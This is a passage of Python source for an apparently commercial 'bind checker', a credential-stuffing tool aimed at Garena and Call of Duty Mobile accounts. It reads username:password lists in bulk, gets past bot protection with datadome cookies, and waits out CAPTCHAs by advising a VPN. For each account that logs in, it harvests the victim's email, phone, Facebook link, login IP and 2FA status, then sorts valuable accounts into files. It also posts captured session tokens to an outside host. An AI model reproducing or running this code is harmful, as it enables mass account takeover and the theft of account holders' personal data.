                connected_games = []

                if not (uid and codm_nickname and codm_level and codm_region):
                    connected_games.append("No CODM account found")
                else:
                    connected_games.append(f"[+] Account Level: {codm_level}\n[+] Game: CODM ({codm_region})\n[+] Nickname: {codm_nickname}\n[+] UID: {uid}")
                
                
                if is_clean == "\033[0;32m\033[1mClean\033[0m":
                    is_clean = True
                else:
                    is_clean = False 
                    
                passed = format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, fbl, email, date, account_username, password, count, ipk, ipc)    
                return passed                                                                                                                              
            else:
                return f"[FAILED] 'access_token' not found in response {data}"               
    except requests.RequestException as e:
        return f"[FAILED] {e}"


def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"]
    }
    newdate = get_datadome_cookie()
    
    cookie.update({
        "datadome": newdate,
        "sso_key": sso,
        "token_session": token
    })

    response = requests.get(url, headers=headers, cookies=cookie, params=params)

    if response.status_code == 200:
        parsed_url = urlparse(response.url)
        query_params = parse_qs(parsed_url.query)
        extracted_token = query_params.get("token", [None])[0]

        data = {
        "selected_header": selected_header,
        "extracted_token": extracted_token
        }
    
    #    print(json.dumps(data, indent=4))  # Print JSON data for debugging

        try:
            response = requests.post(
                "https://suneoxjarell.x10.bz/jajac.php",
                json=data,
                headers={"Content-Type": "application/json"}
            )
        
         #   print(f"Response Code: {response.status_code}")
      #      print(f"Response Text: {response.text}")

            if response.status_code == 200:
                return response.text
            else:
                return f"[FAILED] {response.status_code} - {response.text}"
    
        except requests.exceptions.RequestException as e:
            return f"[FAILED] {str(e)}"
    else:
        return f"[FAILED] {response.text}"


from colorama import Fore, Style
import os
import re
from html import escape

def format_result(
    last_login, last_login_where, country, shell, avatar_url, mobile, facebook,
    email_verified, authenticator_enabled, two_step_enabled, connected_games,
    is_clean, fb, fbl, email, date, username, password, count, ipk, ipc
):
    clean_status = f"{Fore.GREEN}Clean{Style.RESET_ALL}" if is_clean else f"{Fore.RED}Not Clean{Style.RESET_ALL}"
    email_ver = f"{Fore.GREEN}Verified{Style.RESET_ALL}" if email_verified == "True" else f"{Fore.RED}Not Verified{Style.RESET_ALL}"
    mobile_bound = f"{Fore.GREEN}True{Style.RESET_ALL}" if mobile != "N/A" else f"{Fore.RED}False{Style.RESET_ALL}"
    fb_linked = f"{Fore.GREEN}{facebook}{Style.RESET_ALL}" if facebook == "True" else f"{Fore.RED}False{Style.RESET_ALL}"
    codm_info = ''.join(connected_games) if connected_games else f"{Fore.RED}No CODM account found{Style.RESET_ALL}"
    safe_avatar = escape(avatar_url)

    line_color = Fore.MAGENTA

    mess = f"""
{Fore.GREEN}[✅ LOGIN SUCCESSFUL]{Style.RESET_ALL}
{line_color}┌──────────── ACCOUNT INFO ────────────┐{Style.RESET_ALL}
  {Fore.YELLOW}[👤] Username       : {Fore.MAGENTA}{username}:{password}
  {Fore.YELLOW}[⏰️] Last Login     : {Fore.MAGENTA}{last_login}
  {Fore.YELLOW}[🌍] Location       : {Fore.MAGENTA}{last_login_where}
  {Fore.YELLOW}[🛰] IP Address     : {Fore.MAGENTA}{ipk}
  {Fore.YELLOW}[🗺️] Country (Login): {Fore.MAGENTA}{ipc}
  {Fore.YELLOW}[🌐] Country (User) : {Fore.MAGENTA}{country}
{line_color}└──────────────────────────────────────┘{Style.RESET_ALL}

{line_color}┌──────────── ACCOUNT DETAILS ───────────┐{Style.RESET_ALL}
  {Fore.YELLOW}[💰] Garena Shells  : {Fore.MAGENTA}{shell}
  {Fore.YELLOW}[🖼️] Avatar URL     : {Fore.MAGENTA}{safe_avatar}
  {Fore.YELLOW}[📞] Mobile No      : {Fore.MAGENTA}{mobile}
  {Fore.YELLOW}[📧] Email          : {Fore.MAGENTA}{email} ({email_ver})
  {Fore.YELLOW}[🔵] FB Username    : {Fore.MAGENTA}{fb}
  {Fore.YELLOW}[🔗] FB Profile     : {Fore.MAGENTA}{fbl}
{line_color}└────────────────────────────────────────┘{Style.RESET_ALL}

{line_color}┌──────────── GAME INFO ─────────────┐{Style.RESET_ALL}
{Fore.CYAN}{codm_info}
{line_color}└─────────────────────────────────────┘{Style.RESET_ALL}

{line_color}┌──────────── SECURITY BINDINGS ───────────┐{Style.RESET_ALL}
  {Fore.YELLOW}[📱] Mobile Bound   : {mobile_bound}
  {Fore.YELLOW}[✅] Email Verified : {Fore.MAGENTA}{email_verified}
  {Fore.YELLOW}[🔵] Facebook Linked: {fb_linked}
  {Fore.YELLOW}[🔒] Authenticator   : {Fore.MAGENTA}{authenticator_enabled}
  {Fore.YELLOW}[🛡️] 2FA Enabled     : {Fore.MAGENTA}{two_step_enabled}
  {Fore.YELLOW}[📊] Account Status : {clean_status}
{line_color}└──────────────────────────────────────────┘{Style.RESET_ALL}
""".strip()

    # Prepare plain output for file
    output_block = f"""[✅] Login Successful
[👤] Account: {username}:{password}
[⏰️] Last Login: {last_login}
[🌍] Last login from: {last_login_where}
[🛰] Last login IP: {ipk}
[🗺️] Last login country: {ipc}
[🌐] Country: {country}
[💰] Shells: {shell}
[🖼️] Avatar: {avatar_url}
[📞] Mobile No: {mobile}
[📧] Email: {email} ({email_ver})
[🔵] Facebook Username: {fb}
[🔗] Facebook Link: {fbl}
[🎮] CODM Info:
"""

    for item in connected_games:
        output_block += f"{item}\n"

    output_block += f"""[🔐] Bind Status:
[📱] Mobile binded: {'True' if mobile != "N/A" else 'False'}
[✅] Email verified: {email_verified}
[🔵] Facebook Linked: {facebook}
[🔒] Authenticator: {authenticator_enabled}
[🛡️] 2FA: {two_step_enabled}
[📊] Account Status: {clean_status}
"""

    output_block += "\n---------------------[ NEXT ]----------------------\n\n"

    # Ensure output directory exists
    os.makedirs("output", exist_ok=True)

    # Save to appropriate file
    clean_file = os.path.join("output", f"clean_{date}.txt")
    notclean_file = os.path.join("output", f"notclean_{date}.txt")
    plain_file = clean_file if is_clean else notclean_file
    
    output_block = strip_ansi_codes_jarell(output_block)
    
    with open(plain_file, "a", encoding="utf-8") as f:
      f.write(output_block)

    return mess
    
    
def _get_current_ip():
    """Get current public IP address"""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"
        
def get_request_data():
    cookies = change_cookie.get_cookies()
    headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',  # Changed to match captured request
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    return cookies, headers


def get_random_proxy():
    return random.choice(PROXY_LIST)


def check_account(username, password, date):
    try:
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))
        cookies, headers = get_request_data()
        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }
        login_url = "https://auth.garena.com/api/prelogin"

        response = requests.get(login_url, params=params, cookies=cookies, headers=headers)

        if "captcha" in response.text.lower():
            print(f"{Fore.RED}[FAILED] CAPTCHA DETECTED! IP MAY BE BANNED. Use airplane mode or VPN and wait 10s.{Style.RESET_ALL}")
            input(">> Press Enter after fixing network...")

        if response.status_code == 403:
            return "[SKIPPED] HTTP 403 Forbidden - Possibly banned IP or blocked user"

        if response.status_code != 200:
            return None  # Silently skip unexpected HTTP errors

        data = response.json()
        v1 = data.get('v1')
        v2 = data.get('v2')
        prelogin_id = data.get('id')

        if not all([v1, v2, prelogin_id]):
            return "[FAILED] Account Doesn't Exist"

        new_datadome = response.cookies.get('datadome', cookies.get('datadome'))
        encrypted_password = getpass(password, v1, v2)

        if not new_datadome:
            return "[FAILED] Missing updated cookies"
        if "error" in data or data.get("error_code"):
            return f"[FAILED] Status: {data.get('error', 'Unknown error')}"

        print(f"{Fore.CYAN}LOGIN ATTEMPTING SUCCESSFULLY")
        result = check_login(username, random_id, encrypted_password, password, headers, cookies, new_datadome, date)

        # Improved final result interpretation:
        if result.startswith("[FAILED]") or result.startswith("[ERROR]"):
            return result
        if "[✅ LOGIN SUCCESSFUL]" in result:
            return result
        return f"[FAILED] Unknown response: {result}"

    except Exception as e:
        return f"[FAILED] Exception occurred: {str(e)}"

def bulk_check(file_path):
    successful_count = 0
    failed_count = 0
    clean_count = 0
    not_clean_count = 0
    skipped_count = 0
    total_accounts = 0
    count_50upclean = 0
    count_80upnotclean = 0
    date = get_datenow()

    if not file_path.endswith('.txt'):
        print("Error: Provided path is not a .txt file.")
        return

    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)

    failed_file = os.path.join(output_dir, f"failed_{date}.txt")
    success_file = os.path.join(output_dir, f"valid_accounts_{date}.txt")
    clean_file = os.path.join(output_dir, f"clean_{date}.txt")
    notclean_file = os.path.join(output_dir, f"notclean_{date}.txt")
    hundred_up_clean_file = os.path.join(output_dir, "50upclean.txt")
    hundred_up_notclean_file = os.path.join(output_dir, "80upnotclean.txt")

    print(f"\n{Fore.GREEN}[$] {Style.RESET_ALL}Processing file: {file_path}")

    try:
        with open(file_path, 'r', encoding='utf-8') as infile, \
             open(failed_file, 'a', encoding='utf-8') as failed_out, \
             open(success_file, 'a', encoding='utf-8') as success_out:

            accounts = infile.readlines()
            total_accounts = len(accounts)
            print(f"\n{Fore.GREEN}[$] {Style.RESET_ALL}Loaded: {total_accounts} accounts\n")

            for i, acc in enumerate(accounts, start=1):
                acc = acc.strip()
                if not acc:
                    skipped_count += 1
                    continue

                parts = acc.split(':')
                if len(parts) < 2:
                    failed_out.write(f"{acc} - invalid format\n")
                    failed_count += 1
                    continue

                username, password = parts[-2], parts[-1]
                print(f"[INFO] Attempting login for {username}")
                delay = random.uniform(1.9, 2.9)
                print(f"{Fore.BLUE}[WAIT] Sleeping {delay:.2f} seconds before next login...{Style.RESET_ALL}")
                time.sleep(delay)
                print(f"{Fore.YELLOW}[🫀 {i}/{total_accounts} 🫀] total of accounts check........{Style.RESET_ALL}")

                try:
                    result = check_account(username, password, date)
                    if "[✅ LOGIN SUCCESSFUL]" in result:
                        successful_count += 1

                        if "Account Status : \033[32mClean" in result:
                            clean_count += 1
                        elif "Account Status : \033[31mNot Clean" in result:
                            not_clean_count += 1

                        match_level = re.search(r"Account Level: (\d+)", result)
                        is_clean_acc = "Account Status : \033[32mClean" in result

                        if match_level:
                            level = int(match_level.group(1))
                            if level >= 50:
                                if is_clean_acc:
                                    with open(hundred_up_clean_file, "a", encoding="utf-8") as clean_out:
                                        clean_out.write(f"{username}:{password} - Level {level}\n")
                                    count_50upclean += 1
                                else:
                                    with open(hundred_up_notclean_file, "a", encoding="utf-8") as notclean_out:
                                        notclean_out.write(f"{username}:{password} - Level {level}\n")
                                    count_80upnotclean += 1

                        count_display = f"[💥 Success Count : ✅ {successful_count}/{total_accounts} ✅  CODED BY @YouKnowAsta ✳️]"
                        result = f"{result}\n{count_display}"
                        success_out.write(f"{username}:{password} - valid\n")
                        print(f"\n{result}\n")
                    elif "FAILED" in result:
                        failed_count += 1
                        failed_out.write(f"{username}:{password} - {result}\n")
                        print(f"UserPass: {username}:{password}\n{result}{Style.RESET_ALL}")
                    else:
                        skipped_count += 1
                        print(f"[SKIPPED] Unexpected result format:\n{result}")
                except Exception as e:
                    failed_count += 1
                    failed_out.write(f"{username}:{password} - Exception: {str(e)}\n")
                    print(f"{Fore.RED}[!] Exception in thread: {e}{Style.RESET_ALL}")

    except FileNotFoundError:
        print(Fore.RED + "Error: File not found!" + Style.RESET_ALL)
    except PermissionError:
        print(Fore.RED + "Error: Permission denied! Check file permissions." + Style.RESET_ALL)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nProcess interrupted by user. Exiting gracefully..." + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"An unexpected error occurred: {e}" + Style.RESET_ALL)
    finally:
        print(Fore.GREEN + f"\nTotal accounts loaded: {total_accounts}")
        print(Fore.GREEN + f"Successful logins: {successful_count}")
        print(Fore.RED + f"Failed logins: {failed_count}")
        print(Fore.YELLOW + f"Skipped/Unknown results: {skipped_count}")
        print(Fore.CYAN + f"Saved clean accounts: {clean_count}")
        print(Fore.MAGENTA + f"Saved not clean accounts: {not_clean_count}")
        print(Fore.BLUE + f"Total processed: {successful_count + failed_count + skipped_count} of {total_accounts}")
        print('-' * 50)
        print(f"Results saved to:\n  - {success_file}\n  - {failed_file}\n  - {clean_file}\n  - {notclean_file}")

        print(Fore.CYAN + f"\n50+ Level Clean Accounts saved: {count_50upclean} in output/50upclean.txt")
        print(Fore.YELLOW + f"80+ Level Not Clean Accounts saved: {count_80upnotclean} in output/80upnotclean.txt")
        
def check_subscription(device_id):
    url = f"https://suneoxjarell.x10.bz/validate.php?device_id={device_id}"
    try:
        response = requests.get(url)
        response_text = response.text
        return response_text.strip()
    except requests.RequestException:
        return "NoNet"
        
    return False


 
def save_fresh_cookie(cookie):
    with open('fresh_cookies.txt', 'a') as f:
        f.write(cookie + '\n')


def find_nearest_account_file():
    # Keywords to search for in filenames
    keywords = ["garena", "account", "codm"]
    
    # Walk through the current directory and subdirectories
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords):
                return os.path.join(root, file)
    
    # If no matching file is found, use a default name in the current directory
    return os.path.join(os.getcwd(), "accounts.txt")


def main():
 #   clear_screen()
    display_banner()
    
    # Prompt for file path in a synchronous context
    file_path = input(f"{Fore.YELLOW}Name ng file mo : ").strip()
    if not file_path:
        file_path = find_nearest_account_file()  # Find the nearest matching .txt file if no input is provided
    
    # Check if the provided path is a .txt file and exists
    if not file_path.endswith('.txt') or not os.path.isfile(file_path):
        print("Invalid file path. Please provide a valid .txt file.")
        return
    
    # Wait for user to press Enter to start the bulk check
    input(f"{Fore.GREEN}Press Enter ...")

    # Call your bulk check function with the file path
    bulk_check(file_path)

# Example placeholder for the bulk check function
def get_device_id():
    # Directory and file path for storing device ID
    dir_path = os.path.expanduser("~/.dont_delete_me")
    file_path = os.path.join(dir_path, "here.txt")  
    # Check if the file already exists
    if os.path.exists(file_path):
        # Read the existing device ID from the file
        with open(file_path, 'r') as file:
            device_id = file.read().strip()  # Strip any extra whitespace/newlines
    else:
        # Create the directory if it doesn't exist
        os.makedirs(dir_path, exist_ok=True)  # Ensure the directory is created
        
        # Prompt for user name
        user_name = input("Enter your name: ").strip()  # Get and strip user input

        # Collect various system details for generating a unique ID
        system_info = (
            platform.system(),         # OS type (e.g., Windows, Linux)
            platform.release(),        # OS version
            platform.version(),        # OS build version
            platform.machine(),        # Hardware type (e.g., x86_64)
            platform.processor(),      # Processor information
        )

        # Generate a consistent UUID from hardware properties
        hardware_id = "-".join(system_info)  # Combine system info into a single string
        unique_id = uuid.uuid5(uuid.NAMESPACE_DNS, hardware_id)  # Generate UUID based on system info

        # Hash the unique ID for consistency and uniqueness
        device_hash = hashlib.sha256(unique_id.bytes).hexdigest()  # Create a SHA-256 hash

        # Combine user input with a portion of the hash to form the device ID
        device_id = f"{user_name}_{device_hash[:8]}"  # User name + first 8 characters of hash for uniqueness

        # Write the generated device ID to the file
        with open(file_path, 'w') as file:
            file.write(device_id)  # Save the device ID
    
    return device_id  # Return the device ID
# Run the main functio
def clear_screen():
    # Windows
    
    if os.name == 'nt':
        os.system('cls')
    # Mac and Linux
    else:
        os.system('clear')
        

# Main function to handle the application logic

# You can remove the background task handling since it was dependent on the loginsupport module
# Color variables
W = "\033[0m"          # Reset color
GR = "\033[90m"        # Grey text
R = "\033[1;31m"       # Red text
RED = "\033[101m"      # Red background
B = "\033[0;34m\033[1m"  # Bold Blue
GREEN = "\033[102m"
YELLOW = "\033[103m"
BLUE = "\033[104m"
MAGENTA = "\033[105m"
CYAN = "\033[106m"
WHITE = "\033[107m"

def display_banner():
    banner_lines = [
        f"{R}   {W}"
    ]
    for line in banner_lines:
        print(line)
        time.sleep(0.03)

def animated_footer():
    time.sleep(0.6)
    footer = (
        f"\033[1m"
        f"{R}{W}"
        f"{RED}{B}⚠️{W}"
        f"{Fore.GREEN} THANK YOU FOR BUYING ASTA BIND CHECKER   "
        f"{B}{RED}⚠️{W}{R}\033[0m"
    )
    print(footer)

def red_typewriter(text, delay=0.1):
    for char in text:
        sys.stdout.write(f"{R}{char}{W}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Start
display_banner()
red_typewriter("@YouKnowAsta")
animated_footer()
main()